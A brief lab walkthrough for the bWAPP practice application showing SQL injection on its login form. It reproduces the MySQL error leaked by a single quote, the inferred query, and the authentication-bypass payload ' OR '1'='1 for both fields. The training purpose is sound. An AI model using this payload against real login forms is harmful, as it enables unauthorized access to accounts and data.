# SQL Injection for Login Form (Hero)
URL:http://(TARGET IP ADDRESS)/bWAPP/sqli_3.php 

If we place a single quote into the username box, we get the following output from the MySQL service via PHP,
```
 Error: You have an error in your SQL syntax; 
 check the manual that corresponds to your MySQL server version for the right syntax 
 to use near '''' AND password = ''' at line 1
 ```
Now, we can easily exploit the query since we can actually see it,
```
SELECT * from USERS WHERE USER = '' AND PASSWORD = '';
```
Simple use the following SQL Syntax in the form's `username` and `password` fields,
```
' OR '1'='1
```
